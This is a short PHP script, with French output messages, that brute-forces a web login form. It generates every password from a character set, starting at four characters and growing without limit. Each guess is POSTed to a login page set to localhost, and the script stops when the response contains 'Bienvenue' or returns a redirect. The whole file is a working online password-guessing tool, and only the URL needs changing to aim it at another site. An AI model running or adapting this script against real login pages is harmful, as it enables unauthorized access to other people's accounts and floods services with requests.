<?php

set_time_limit(0);
ignore_user_abort(true);

$charset = str_split("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&#éè@ç_-/\\");
$url = "http://localhost/login.php";
$passwordField = "password";
$successIndicator = "Bienvenue";

function tryPassword($password, $url, $field, $successIndicator) {
    $postData = http_build_query([
        $field => $password
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_POST, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if (strpos($response, $successIndicator) !== false || $httpCode === 302) {
        echo "\n Mot de passe trouvé : $password\n";
        exit;
    }

    echo "Tentative : $password\n";
}

function bruteForce($charset, $prefix, $length, $callback) {
    if (strlen($prefix) === $length) {
        call_user_func($callback, $prefix);
        return;
    }

    foreach ($charset as $char) {
        bruteForce($charset, $prefix . $char, $length, $callback);
    }
}

$length = 4;
while (true) {
    echo "\nlongueur de $length...\n";
    bruteForce($charset, "", $length, function($password) use ($url, $passwordField, $successIndicator) {
        tryPassword($password, $url, $passwordField, $successIndicator);
    });
    $length++;
}
